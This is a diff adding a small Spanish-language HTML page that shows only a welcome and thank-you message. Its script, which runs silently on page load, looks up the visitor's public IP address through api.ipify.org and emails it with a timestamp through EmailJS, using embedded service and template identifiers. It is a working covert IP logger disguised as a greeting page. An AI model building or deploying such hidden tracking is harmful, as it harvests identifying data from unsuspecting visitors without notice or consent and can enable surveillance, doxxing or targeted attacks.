@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hola!</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  <script>
+    function sendMail(ip) {
+      emailjs.init("4rUoRWP75qsrbje9s"); 
+      emailjs.send("service_g8fujzp", "template_szbt8or", {
+        ip: ip,
+        fecha: new Date().toLocaleString()
+      });
+    }
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        sendMail(data.ip);
+      });
+  </script>
+</head>
+<body>
+	<center>
+  <h1>Bienvenido</h1>
+  <p>Gracias por visitar</p>
+  </center>
+</body>
+</html>
